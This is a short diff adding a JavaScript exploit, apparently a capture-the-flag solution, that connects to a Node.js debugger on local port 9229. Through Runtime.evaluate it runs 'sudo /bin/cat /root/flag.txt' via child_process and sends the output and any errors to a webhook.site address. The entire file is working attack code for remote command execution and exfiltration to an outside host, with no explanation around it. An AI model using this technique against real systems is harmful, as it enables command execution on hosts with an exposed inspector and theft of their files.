@@ -1,0 +1,24 @@
+window.ws = new WebSocket('ws://127.0.0.1:9229/648c73be-cb71-4cbf-b5b2-2e3c3e43e4f4')
+  ws.onerror = (e) => {
+    fetch("https://webhook.site/REDACTED?e=" + btoa(e.toString()))
+  }
+  ws.onmessage = (e) => {
+    fetch("https://webhook.site/REDACTED?e=" + btoa(e.data))
+  }
+
+  ws.onopen = () => {
+    ws.send(JSON.stringify(
+      {
+        id: 1,
+        method: "Runtime.evaluate",
+        params: {
+          includeCommandLineAPI: true, 
+          expression: ` (function(){
+      cp = require("child_process")          
+      sh = cp.execSync("sudo /bin/cat /root/flag.txt" ); 
+      return new TextDecoder().decode(sh);
+  })();       `
+        }
+      }
+    ))
+  }
